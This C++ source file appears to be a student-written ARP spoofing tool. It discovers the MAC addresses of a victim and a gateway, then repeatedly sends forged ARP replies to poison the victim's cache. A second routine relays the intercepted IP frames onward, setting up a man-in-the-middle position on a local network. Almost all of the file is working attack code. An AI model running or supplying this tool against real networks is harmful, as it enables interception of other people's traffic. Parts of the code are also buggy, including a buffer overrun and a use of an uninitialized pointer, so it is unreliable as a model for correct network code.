#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <errno.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <iostream> //add
#include <thread>   //add
#include <pthread.h>


#pragma pack(push,1)


struct ether_hoder
{
    uint8_t  hoder_dhost[6];
    uint8_t  hoder_shost[6];
    uint16_t hoder_type;
};

struct makearphdr
{
    uint16_t ar_hrd;
    uint16_t ar_pro;
    uint8_t ar_hln;
    uint8_t ar_pln;
    uint16_t ar_op;
    uint8_t ar_sha[6];
    uint32_t ar_sip;
    uint8_t ar_tha[6];
    uint32_t ar_tip;
};
/*
struct mix
{
    struct ether_hoder;
    struct makearphdr;
};
*/

#pragma pack(pop)
void make_mac(const char *str,uint8_t *a);
void make_t_mac(const u_char *pkt_data, u_int8_t *macsavebox, char *gatewayip); //get mac addr from reply
void infect_start(pcap_t *ph, uint8_t *packet_data, u_int8_t *gac, u_int8_t *vicmac,u_int8_t *mm);
void help_relay(pcap_t *a, char *mymac, uint8_t *gatemac);

int main(int argc, char *argv[])
{
    if(argc != 4)
    {
        printf("you must enter 4 parameter!!\n ");
        printf(" <dev> <target ip> <sender ip> \n");
        return 0;
    }
    char *dev=argv[1];


    //-------------------------------------------------------------- get my mac!!
    char mm[17];//mymac
    FILE *a;
    a=popen("ifconfig -a | grep ether | awk '{print $2}'","r");
    fgets((char*)mm,18, a);
    //-------------------------------------------------------------- get my ip!!
    FILE *b;
    b=popen("ip addr | grep 'inet' | grep brd | awk '{printf $2}' | awk -F/ ' {printf $1}'","r");
    char mip[16];
    fgets(mip,16,b);
    u_int32_t mmip;
    inet_pton(AF_INET, mip, &mmip);
    //--------------------------------------------------------------
    //=====================================Auto GET victim MAC Addr===================================
    uint8_t mymac[6];
    make_mac(mm,mymac);

    char *seip=argv[2];
    uint32_t asip;         //<-fix because not gateway ip , my pc ip
    inet_pton(AF_INET, seip, &asip);

    char *taip=argv[3]; //<-ho temp
    uint32_t atip;
    inet_pton(AF_INET, taip, &atip);

    uint16_t etype = htons(0x0806);
    struct makearphdr rq;

    rq.ar_hrd = htons(0x0001);
    rq.ar_pro = htons(0x0800);
    rq.ar_hln = 0x06;
    rq.ar_pln = 0x04;
    rq.ar_op  = htons(0x0001);

    //Mac arpsm;//auto check..    <-fix later
    //arpsm=argv[4];//            <-fix later
    uint8_t rq_packet[42];
    memset(rq_packet,0,42);

    memset(rq_packet,0xFF,6);
    memcpy(rq_packet+6,&mymac,6);
    memcpy(rq_packet+12,&etype,2);
    memcpy(rq_packet+14,&rq.ar_hrd,2);
    memcpy(rq_packet+16,&rq.ar_pro,2);
    memcpy(rq_packet+18,&rq.ar_hln,1);
    memcpy(rq_packet+19,&rq.ar_pln,1);
    memcpy(rq_packet+20,&rq.ar_op,2);
    memcpy(rq_packet+22,&mymac,6);
    memcpy(rq_packet+28,&mmip,4);
    memset(rq_packet+32,0xFF,6);
    memcpy(rq_packet+38,&atip,4);

    pcap_t *ph;
    char errbuf[PCAP_ERRBUF_SIZE];
    //---------------------------------------------------------------------------------------send request arp
    ph=pcap_open_live(dev,BUFSIZ,0,1,errbuf);
    if(ph==NULL)
    {
        printf("%s\n",errbuf);
        return 0;
    }
    pcap_sendpacket(ph,(u_char*)rq_packet,42);

/*
    if(pcap_sendpacket(ph,(u_char*)rq_packet,42) != 0)
    {
        printf(stderr,"\n Error sending the packet:\n",pcap_geterr(ph));
    }
*/




  //  /////////////////////////////////////////////////////////////////////////////////////////////////
    //look reply ip!!!  <--fix
    int res;
    u_int8_t tm[6]; //tm, arp_tm -> get reply from mac addr
    const u_char *pkt_data; //
    struct pcap_pkthdr *header; //

    while((res=pcap_next_ex(ph, &header, &pkt_data))>=0)  //<fix here 4/27
    {
        if(res==1)
        {
            make_t_mac(pkt_data,tm,argv[3]); // get reply data -> target mac //<-ho temp
            break;

        }
        else if(res==0)
        {
            printf("Time out error\n");
            continue;
        }
        else
            break;
    }
    pcap_close(ph);

    //---------------------------------------------------------------------------------------request gateway

        char *gateip=argv[2];
        u_int32_t gate_t_ip;
        inet_pton(AF_INET, gateip, &gate_t_ip);

        uint8_t rqgate_packet[42]; //make complete packet

        memset(rqgate_packet,0,42);

        memset(rqgate_packet,0xFF,6);//ff~ff
        memcpy(rqgate_packet+6,&mymac,6);//my mac
        memcpy(rqgate_packet+12,&etype,2);
        memcpy(rqgate_packet+14,&rq.ar_hrd,2);
        memcpy(rqgate_packet+16,&rq.ar_pro,2);
        memcpy(rqgate_packet+18,&rq.ar_hln,1);
        memcpy(rqgate_packet+19,&rq.ar_pln,1);
        memcpy(rqgate_packet+20,&rq.ar_op,2);
        memcpy(rqgate_packet+22,&mymac,6);//my mac
        memcpy(rqgate_packet+28,&mmip,4);//my ip
        memset(rqgate_packet+32,0xFF,6);//ff~ff
        memcpy(rqgate_packet+38,&gate_t_ip,4);//gate ip : argv[2]


    //---------------------------------------------------------------------------------------send gateway request arp
        ph=pcap_open_live(dev,BUFSIZ,0,1,errbuf);
        if(ph==NULL)
        {
           printf("%s\n",errbuf);
           return 0;
        }
        pcap_sendpacket(ph,(u_char*)rqgate_packet,42);

    //------------------------------reply gate mac information-------------------------------------------------


        int repl;
        u_int8_t gatemac[6]; //tm, arp_tm -> get reply from mac addr
        const u_char *gate_data; //
        struct pcap_pkthdr *gheader; //

        while((repl=pcap_next_ex(ph, &gheader, &gate_data))>=0)
        {
            if(repl==1)
            {
                make_t_mac(gate_data,gatemac,argv[2]); // get reply data -> target mac //<-ho temp
                break;
            }
            else if(repl==0)
            {
                printf("Time out error\n");
                continue;
            }
            else
                break;  //<-fix at here*/
        }
        pcap_close(ph);

//-//////////////////////////////////////////////////////infection reply start//////////////////////////////////////////////////////////////

//---------------------------------------------------------------------------------------arp protocol
        struct makearphdr ap;

        ap.ar_op  = htons(0x0002);

        char *arp_sip = argv[2];
        u_int32_t s_ip;
        inet_pton(AF_INET, arp_sip, &s_ip);

        char *arp_tip = argv[3];
        u_int32_t t_ip;
        inet_pton(AF_INET, arp_tip, &t_ip);

        uint8_t packet[42]; //make complete packet

        memset(packet,0,42);

        memcpy(packet,&tm,6);
        memcpy(packet+6,&mymac,6);
        memcpy(packet+12,&etype,2);
        memcpy(packet+14,&rq.ar_hrd,2);
        memcpy(packet+16,&rq.ar_pro,2);
        memcpy(packet+18,&rq.ar_hln,1);
        memcpy(packet+19,&rq.ar_pln,1);
        memcpy(packet+20,&ap.ar_op,2);
        memcpy(packet+22,&mymac,6);
        memcpy(packet+28,&s_ip,4);
        memcpy(packet+32,&tm,6);
        memcpy(packet+38,&t_ip,4);




        //---------------------------------------------------------------------------------------send infection reply arp
        ph=pcap_open_live(dev,BUFSIZ,0,1,errbuf); // 0 - >1

        if(ph==NULL)
        {
            printf("%s\n",errbuf);
            return 0;
        }

        //---------------------------------------------------------------------------------------send relay

        std :: thread infect(&infect_start,ph,packet,gatemac,tm,mymac);
        help_relay(ph,mm,gatemac);
        infect.join();



}

//=========================================================================================


void make_t_mac(const u_char *pkt_data, u_int8_t *macsavebox, char *gatewayip)//아이피를 비교해서 출발지가 게이트웨이아이피일때와 인자게이트웨이아이피 맞을때만 맥주소를 가져오는 함수
{
    u_int32_t match_sip;
    match_sip=inet_addr(gatewayip);

    struct makearphdr* ep=(struct makearphdr *)(pkt_data+14);

    u_int32_t packetip=ep->ar_sip;

    if(match_sip==packetip)  //argv[2] 게이트웨이 아이피 와 패킷에서의 arp source ip 가 같을때만 맥을 빼온다.
    {
        memcpy(macsavebox,((struct ether_hoder *)pkt_data)->hoder_shost,6);
    }
}


void infect_start(pcap_t *ph, uint8_t *packet_data, u_int8_t *gac, u_int8_t *vicmac, u_int8_t *mm) //ph, packet, gateway mac, victim mac
{
    struct makearphdr *ar;
    uint8_t ff[6];
    for(int i=0; i<6; i++)   //<-think fix
        ff[i]=255;

    while(ph!=NULL)
    {
            pcap_sendpacket(ph,(u_char*)packet_data,42);
            sleep(3);//recover test
    }

        if(memcmp(ar->ar_sha,gac,6) + memcmp(ar->ar_tha,vicmac,6)==0 || memcmp(ar->ar_sha,vicmac,6)+ memcmp(ar->ar_tha,gac,6)==0 || memcmp(ar->ar_sha,gac,6)+ memcmp(ar->ar_tha,ff,6)==0)
        {
            pcap_sendpacket(ph,(u_char*)packet_data,42);
        }

}

void help_relay(pcap_t *a,char *mymac, uint8_t *gatemac) //relay를 할 조건 : mymac 와 패킷의 도착지 가 같아야함 c:mymac  d:myip
{

    struct pcap_pkthdr *header;
    const u_char *packdata;
    int s_vic;
    while(true)
    {
        while((s_vic=pcap_next_ex(a, &header, &packdata))>=0)
        {
            if(s_vic==1)
            {
                struct ether_hoder *eh;
                eh = (struct ether_hoder*)packdata;

                uint8_t me_m[6];
                make_mac(mymac,me_m);
                uint8_t pac_dmac[6];
                memcpy(pac_dmac,eh->hoder_dhost,6);

                uint16_t packet_type=eh->hoder_type;
                uint16_t match_type = ntohs(ETHERTYPE_IP);


                if(packet_type==match_type)
                {
                     printf("first test success\n");
                     if(memcmp(pac_dmac,me_m,6)==0)
                     {
                           printf("go relay data\n");
                           memcpy(eh->hoder_dhost,gatemac,6);
                           memcpy(eh->hoder_shost,me_m,6);
                           pcap_sendpacket(a,(u_char*)packdata,header->len);
                           break;
                      }
                 }
            }
            else if(s_vic<=0)
            {
                printf("Time out error\n");
                continue;
            }
        }
    }
}

void make_mac(const char *str,uint8_t *a)
{
    sscanf(str, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",&a[0],&a[1],&a[2],&a[3],&a[4],&a[5]);
}
